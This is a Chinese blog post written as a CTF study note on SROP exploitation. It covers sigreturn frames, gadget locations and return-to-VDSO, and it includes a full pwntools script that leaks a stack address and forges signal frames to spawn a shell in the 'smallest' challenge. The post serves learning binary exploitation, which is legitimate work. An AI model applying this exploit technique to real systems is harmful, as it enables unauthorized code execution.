@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		
+		<title>CTF | srop 利用 - Yuuoniy&#39;s blog</title>
+		
+		<meta name="description" content="SROP(Sigreturn Oriented Programming)
+SROP signal 机制 32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15
+过程： 推荐看 angelboy 的 ppt
+x86mov eax,0x77int 0x80x64mov rax,0xfsyscall利用要点  利用 sigreturn ,构造 syscall 控制所有寄存器 控制 ip 和 stack 需要足够的栈空间保存 signal frame 直接伪造 sigcontext 结构，全部 push 进 stack 将 ret address 设在 sigreturn syscall 的 gadget 将 signal frame 中的 rip(eip) 设在 syscall sigreturn 回来后就会执行我们自己构造的 syscall  要求  利用栈溢出控制栈内容 相应的地址  &lsquo;/bin/sh&rsquo; signal frame syscall sigreturn    系统调用链  控制栈指针 rsp 把原来 rip 指向的 syscall gadget 换成 syscall;ret gadget  基本思路：首先构造一个 fake signal frame 写入内存中，将然后将 RSP 指向这段空间，再发送 rt_sigreturn 信号（ 利用 eax 和 syscall 调用 sigreturn 控制 rax=15 32位是 0x77）。此时，内核会将构造好的 fake signal frame 取出，恢复。恢复后类似于ROP的方式，为 syscall 调用 execve">
+		<meta name="author" content="">
+		<meta name="generator" content="hugo-plains https://gitlab.com/hugo-plains/hugo-plains">
+		
+		<link href="https://blog.yuuoniy.cn/an-old-hope.min.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/style.css" rel="stylesheet">
+		<link href="https://blog.yuuoniy.cn/custom.css" rel="stylesheet">
+		
+		<link rel="apple-touch-icon" href="https://blog.yuuoniy.cn/apple-touch-icon.png">
+		<link rel="icon" href="https://blog.yuuoniy.cn/favicon.ico">
+		<meta name="generator" content="Hugo 0.76.5" />
+		
+		
+		
+		<script>
+			function setTheme() {
+				if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+					document.body.classList.add('dark');
+					return;
+				}
+				
+				let date = new Date();
+				let time = date.getTime();
+				let sunrise = date.setHours(7, 00); 
+				let sunset = date.setHours(20, 00); 
+
+				if (time < sunrise || time > sunset)
+					document.body.classList.add('dark');
+			}
+		</script>
+		
+	</head>
+	<body class="single">
+		
+		<script>
+			setTheme();
+			console.log("This site was made using Hugo and Plains. https://gohugo.io https://gitlab.com/hugo-plains/hugo-plains");
+		</script>
+		
+		<header class="header">
+			<nav class="nav">
+				<p class="logo"><a href="https://blog.yuuoniy.cn">Yuuoniy&#39;s blog</a></p>
+				<ul class="menu">
+					<li>
+						<a href="/posts/">Posts</a>
+					</li>
+					<li>
+						<a href="/tags/">Tags</a>
+					</li>
+					<li>
+						<a href="/about/">About</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+		<main class="main">
+
+
+<article class="post-single">
+	<header class="post-header">
+		<h1 class="post-title">CTF | srop 利用</h1>
+		<div class="post-meta">September 19, 2018</div>
+	</header>
+	<div class="post-content"><p>SROP(Sigreturn Oriented Programming)</p>
+<!-- raw HTML omitted -->
+<h2 id="srop">SROP</h2>
+<h3 id="signal-机制">signal 机制</h3>
+<p><code>32</code> 位的 <code>sigreturn</code> 的调用号为 <code>77</code>，<code>64</code> 位的系统调用号为 <code>15</code></p>
+<p>过程：
+推荐看 angelboy 的 ppt</p>
+<pre><code class="language-x86asm" data-lang="x86asm">x86
+mov eax,0x77
+int 0x80
+x64
+mov rax,0xf
+syscall
+</code></pre><h3 id="利用要点">利用要点</h3>
+<ul>
+<li>利用 sigreturn ,构造 syscall</li>
+<li>控制所有寄存器</li>
+<li>控制 ip 和 stack</li>
+<li>需要足够的栈空间保存 signal frame</li>
+<li>直接伪造 sigcontext 结构，全部 push 进 stack</li>
+<li>将 ret address 设在 sigreturn syscall 的 gadget</li>
+<li>将 signal frame 中的 rip(eip) 设在 syscall</li>
+<li>sigreturn 回来后就会执行我们自己构造的 syscall</li>
+</ul>
+<h3 id="要求">要求</h3>
+<ul>
+<li>利用栈溢出控制栈内容</li>
+<li>相应的地址
+<ul>
+<li>&lsquo;/bin/sh&rsquo;</li>
+<li>signal frame</li>
+<li>syscall</li>
+<li>sigreturn</li>
+</ul>
+</li>
+</ul>
+<h3 id="系统调用链">系统调用链</h3>
+<ul>
+<li>控制栈指针 rsp</li>
+<li>把原来 rip 指向的 <code>syscall</code> gadget 换成 <code>syscall;ret</code> gadget</li>
+</ul>
+<p>基本思路：首先构造一个 <code>fake signal frame</code> 写入内存中，将然后将 <code>RSP</code> 指向这段空间，再发送 <code>rt_sigreturn</code> 信号（ 利用 eax 和 syscall 调用 sigreturn  控制 <code>rax=15</code> 32位是 0x77）。此时，内核会将构造好的 <code>fake signal frame</code> 取出，恢复。恢复后类似于ROP的方式，为 <code>syscall</code> 调用 <code>execve</code></p>
+<h3 id="sigreturn-gadget">Sigreturn gadget</h3>
+<ul>
+<li>x86
+<ul>
+<li>vdso &lt;= 正常的 syscall handler 也會使⽤這邊</li>
+</ul>
+</li>
+<li>x64
+<ul>
+<li>kernel &lt; 3.3
+<ul>
+<li>vsyscall (0xffffffffff600000) &lt;= 位置⼀直都固定</li>
+</ul>
+</li>
+<li>kernel &gt;= 3.3
+<ul>
+<li>libc &lt;= 正常的 syscall handler 也會使⽤這邊</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>利⽤ ROP 製造</li>
+</ul>
+<p><code>sigreturn</code> 的功能为 <code>push frame</code> 中的内容到寄存器。 <code>call sigreturn</code> 时，<code>esp</code> 肯定是指向 <code>frame</code> 之前的地址的第一个字节（首位的一些字节被覆盖也没事）。 <code>sigreturn_addr + str(frame)</code></p>
+<h3 id="例题-smallest">例题 smallest</h3>
+<p>程序很简单
+调用 read</p>
+<pre><code class="language-x86asm" data-lang="x86asm">public start
+start           proc near               ; DATA XREF:
+xor     rax, rax
+mov     edx, 400h       ; count
+mov     rsi, rsp        ; buf
+mov     rdi, rax        ; fd
+syscall                 ; LINUX - sys_read
+retn
+</code></pre><p>相当于调用 <code>read(0,$rsp,400)</code> 有栈溢出
+思路：</p>
+<ul>
+<li>通过控制 <code>read</code> 读取的字符数来设置RAX寄存器的值，从而执行sigreturn</li>
+<li>通过 <code>syscall</code> 执行 <code>execve(&quot;/bin/sh&quot;,0,0)</code> 来获取shell。</li>
+</ul>
+<p>自己还写不出 exp，根据 ctf-wiki 的调一下，写出自己的理解。</p>
+<p>有两种方法：</p>
+<ol>
+<li>
+<p>利用 <code>syscall</code> 调用 <code>mprotect</code> 函数，将一段空间设置为RWX（可读可写可执行），然后将 <code>shellcode</code> ）写到这段空间中去，控制程序执行流跳转执行
+首先利用 bof 布置  <code>mprotect</code> 的 <code>frame，利用</code> rop 回到程序开头置。根据 read 函数，控制 rax 的值来调用 <code>syscall</code> 实现 sigreturn，完成 mprotect 功能（利用 <code>syscall;retn</code> 和 rsp 实现 <code>syscall chain</code> 返回程序起始位置）。再读入 shellcode 执行即可。</p>
+</li>
+<li>
+<p>常规 SROP，在 stack 中读入 <code>'/bin/sh'</code>
+说下2.</p>
+</li>
+</ol>
+<ul>
+<li>泄露地址是必要的，可以利用 <code>write</code> 函数。需要写入<code> '/bin/sh'</code>, <code>write</code> 系统调用号为1，所以绕过 <code>xor rax,rax</code> 刚好使调用号为 1.</li>
+<li>构造 <code>frame</code>, 最后调用 <code>sigreture</code></li>
+</ul>
+<h4 id="地址泄露脚本">地址泄露脚本</h4>
+<ol>
+<li>
+<p>一开始要布置 main_addr*3
+rsp rbp 返回地址</p>
+</li>
+<li>
+<p>第二次send,修改低字节部分，改为返回地址，绕过 xor rax rax 
+泄露的是buf地址，也就是rsp ,那么最多存储16个字节(?)
+buf在栈上，构造 rsp 指向我们泄露的地址
+设置 rax = 15 了：地址8位+7个padding,read 15个字节，作为返回值会存在 rax 中。
+有点不明白：
+<code>payload = p64(start_addr) * 3</code><br>
+<code>p64(start_addr) + 'a' * 8 + str(sigframe)</code> 
+为什么 不设置 context.log_level=&lsquo;debug&rsquo; 泄露地址就会出现错误： 那是因为程序写错了吧&hellip;
+可是真的关了就错了&hellip;?? 为什么&hellip;</p>
+</li>
+</ol>
+<p>payload</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./smallest&#34;</span>)
+
+main_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4000b0</span>
+sys_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4000be</span>
+
+payload <span style="color:#f92672">=</span> p64(main_addr)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xb3</span><span style="color:#e6db74">&#39;</span>)
+stack_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv()[<span style="color:#ae81ff">8</span>:<span style="color:#ae81ff">16</span>])
+
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;leak stack addr:&#34;</span><span style="color:#f92672">+</span>hex(stack_addr))
+
+sigframe <span style="color:#f92672">=</span> SigreturnFrame() <span style="color:#75715e"># syscall(rax,rdi,rsi,rdx)</span>
+sigframe<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_read 
+sigframe<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+sigframe<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> stack_addr
+sigframe<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400</span>
+sigframe<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> stack_addr
+sigframe<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> sys_addr 
+payload <span style="color:#f92672">=</span> p64(main_addr)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>str(sigframe)
+p<span style="color:#f92672">.</span>send(payload)
+
+sigreturn <span style="color:#f92672">=</span> p64(sys_addr)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> <span style="color:#75715e"># rax = 15 </span>
+p<span style="color:#f92672">.</span>send(sigreturn)
+
+sigframe <span style="color:#f92672">=</span> SigreturnFrame()
+sigframe<span style="color:#f92672">.</span>rax <span style="color:#f92672">=</span> constants<span style="color:#f92672">.</span>SYS_execve <span style="color:#75715e"># syscall(execve,binsh_addr,0,0)</span>
+sigframe<span style="color:#f92672">.</span>rdi <span style="color:#f92672">=</span> stack_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200</span> <span style="color:#75715e"># binsh_addr </span>
+sigframe<span style="color:#f92672">.</span>rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+sigframe<span style="color:#f92672">.</span>rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+sigframe<span style="color:#f92672">.</span>rsp <span style="color:#f92672">=</span> stack_addr 
+sigframe<span style="color:#f92672">.</span>rip <span style="color:#f92672">=</span> sys_addr 
+frame_payload <span style="color:#f92672">=</span> p64(main_addr)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span>str(sigframe)
+
+<span style="color:#66d9ef">print</span> len(frame_payload)
+payload <span style="color:#f92672">=</span> frame_payload<span style="color:#f92672">+</span>(<span style="color:#ae81ff">0x200</span><span style="color:#f92672">-</span>len(frame_payload))<span style="color:#f92672">*</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+p<span style="color:#f92672">.</span>send(payload)
+p<span style="color:#f92672">.</span>send(sigreturn)
+p<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div><p><img src="http://p6cwaqxnz.bkt.clouddn.com/smallest-leak-2.png" alt="leak"></p>
+<h4 id="pwnablekr-unexploitable">pwnable.kr unexploitable</h4>
+<p>这道题的题解就看 pwnable.kr writeup 的博文吧</p>
+<h2 id="vdso">VDSO</h2>
+<p>我们再来学一下 VDSO
+主要是为了 syscall 指令 sysenter/sysexit</p>
+<ul>
+<li>
+<p>提供 __kernel_vsyscall 來負責新型的 syscall</p>
+</li>
+<li>
+<p>提供 sigreturn ⽅便在 signal handler 結束後返回
+user code</p>
+</li>
+<li>
+<p>sysenter</p>
+<ul>
+<li>参数传递与 0x80 一样</li>
+<li>需要做 function prolog
+<ul>
+<li>push ebp;mov ebp ,esp</li>
+</ul>
+</li>
+<li>stack pivot 的 gadget</li>
+</ul>
+</li>
+</ul>
+<h3 id="return-to-vdso">return to vdso</h3>
+<p>直接利用 vdso 来做 ROP</p>
+<ul>
+<li>gadgets:
+<ul>
+<li>x86
+<ul>
+<li>sysenter</li>
+<li>sysexit</li>
+</ul>
+</li>
+<li>x64
+有些版本的 kernel 可單靠 vdso 的 gadget 組成 execve</li>
+</ul>
+</li>
+</ul>
+<p>libc 中提到：
+&ldquo;On many architectures the kernel provides a virtual DSO and gives
+<strong>AT_SYSINFO_EHDR</strong> to point us to it. As this is introduced for new
+machines, we should look at it for unwind information even if
+we aren&rsquo;t making direct use of it.  &quot;</p>
+<p><strong>_rtld_global_ro</strong>：This variable is similar to _rtld_local, but all values are
+read-only after relocation.
+找到 vdso 地址</p>
+<ul>
+<li>暴力</li>
+<li>地址泄露</li>
+</ul>
+<p>SROP 比ROP 的优势在于，ROP 需要用大量的 Gadgets 来完成寄存器的设置；而 SROP 只需要一块够大的内存空间，将 fake signal frame 部署到内存中即可。</p>
+<p>例题 defcon 2015 fuckup
+vdso+srop
+稍后再看&hellip;</p>
+<h2 id="相关资料">相关资料</h2>
+<p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf">slides</a></p>
+<p><a href="http://www.freebuf.com/articles/network/87447.html">http://www.freebuf.com/articles/network/87447.html</a> <br>
+<a href="https://bestwing.me/2017/03/20/stack-overflow-three-SROP/">https://bestwing.me/2017/03/20/stack-overflow-three-SROP/</a>  <br>
+<a href="http://thinkycx.me/posts/20170429ichunqiu-pwn-smallest-writeup.html">http://thinkycx.me/posts/20170429ichunqiu-pwn-smallest-writeup.html</a> 讲了利用 mprotect 的思路   <br>
+<a href="https://blog.csdn.net/qq_31481187/article/details/73929569">https://blog.csdn.net/qq_31481187/article/details/73929569</a></p>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
